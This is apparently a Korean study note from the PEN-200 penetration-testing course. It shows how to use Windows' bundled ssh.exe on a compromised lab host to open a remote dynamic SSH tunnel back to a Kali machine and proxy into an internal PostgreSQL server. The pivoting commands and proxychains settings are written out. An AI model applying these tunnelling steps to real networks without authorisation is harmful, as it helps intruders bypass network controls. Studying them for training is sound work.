# 19.4.1 ssh.exe 활용

> **ssh.exe** · PEN-200 §19.4.1

Windows 1803(2018년 4월 업데이트)부터 OpenSSH 클라이언트가 기본 번들되고, 1709(Fall Creators Update)부터는 Feature-on-Demand 로 제공됨. 설치된 시스템에는 `%systemdrive%\Windows\System32\OpenSSH` 에 `ssh.exe`·`scp.exe`·`sftp.exe` 등 `ssh-*` 유틸리티가 있음.

**Windows 용으로 컴파일됐다는 것이 접속 «대상»을 제한하지는 않음** — 자격 증명만 있으면 어떤 SSH 서버로도 붙음. 그래서 장악한 Windows 호스트에서 Kali 로 나가는 터널을 Linux 에서 하던 것과 똑같이 만들 수 있음.

시나리오는 MULTISERVER03(Windows) 에 RDP 만 열려 있고 다른 포트를 WAN 인터페이스에 바인드할 수 없는 상황임. 그래서 방향을 뒤집어 **원격 동적 포워딩**으로 SOCKS 포트를 Kali 쪽에 열고, 그것을 통해 PGDATABASE01 의 PostgreSQL 에 붙는 것이 목표임.

```
kali@kali:~$ sudo systemctl start ssh
[sudo] password for kali:
kali@kali:~$
```

*xfreerdp 로 MULTISERVER03 에 RDP 접속 — 자체서명 인증서 경고는 `Y` 로 신뢰*

RDP 로 들어간 뒤 `cmd.exe` 에서 `where ssh` 로 존재 여부부터 확인함.

```
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Users\rdp_admin>
```

**버전을 반드시 같이 확인할 것.** 원격 동적 포워딩은 OpenSSH **7.6 이상**에서만 되고, Windows 번들판은 그 조건을 만족함.

```
C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```

이후 문법은 Linux 판과 동일함. `-R` 에 소켓을 **하나만**(포트 9998) 넘기면 원격 «동적» 포워딩이 되고, `-N` 으로 셸 할당을 막음. 인증은 Kali 계정 `kali` 로 함.

```
C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.

```

Kali 에서 `ss -ntplu` 로 `127.0.0.1:9998` 리슨을 확인한 뒤, `/etc/proxychains4.conf` 의 `[ProxyList]` 를 그 포트로 맞춤.

```
kali@kali:~$ ss -ntplu

[::]:*
```

*Kali 에서 `127.0.0.1:9998` SOCKS 포트가 열렸는지 `ss` 로 확인*

```
kali@kali:~$ tail /etc/proxychains4.conf

socks5 127.0.0.1 9998
```
